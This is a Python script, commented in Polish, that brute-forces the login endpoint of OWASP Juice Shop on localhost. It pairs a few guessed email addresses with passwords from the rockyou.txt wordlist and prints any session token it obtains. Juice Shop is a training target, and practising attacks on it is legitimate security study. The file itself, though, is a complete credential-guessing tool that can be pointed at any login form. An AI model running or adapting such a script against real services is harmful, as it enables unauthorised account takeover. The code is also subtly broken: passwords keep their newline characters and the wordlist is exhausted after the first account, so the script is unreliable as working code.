import requests
import json

# Adres logowania  Juice-Shop
LOGIN_URL = "http://localhost:3000/rest/user/login"

# Przykładowe maile
usernames = ["admin@juice-sh.op", "user@juice-sh.op", "test@juice-sh.op"]
# Wordlist z popularnymi hasłami
passwords = open('rockyou.txt', 'r', encoding='utf-8',errors='ignore' )

headers = {
    "Content-Type": "application/json"
}

def try_login(email, password):
    payload = {
        "email": email,
        "password": password
    }
    response = requests.post(LOGIN_URL, headers=headers, data=json.dumps(payload))

    if response.status_code == 200:
        # Jeśli status = 200 sprawdź odpowiedź zawiera token
        try:
            token = response.json().get("authentication", {}).get("token")
            # Jeśli tak to udało się zalogować!!!
            if token:
                print(f"[+] Sukces! Zalogowano jako {email} z hasłem '{password}'")
                print(f"    Token: {token}")
                return True
        # Jeśli nie to próbujemy dalej
        except Exception as e:
            pass
    # Jeśli inny status to nie udało się zalogować
    else:
        print(f"[-] Nieudane logowanie: {email} / {password}")
    return False

def brute_force():
    # Próbujemy się zalogować dla każdej kombinacji maila i hasła
    for username in usernames:
        for password in passwords:
            if try_login(username, password):
                return  # Zatrzymanie po sukcesie
    print("[!] Brute-force zakończony – brak poprawnych danych")

if __name__ == "__main__":
    brute_force()
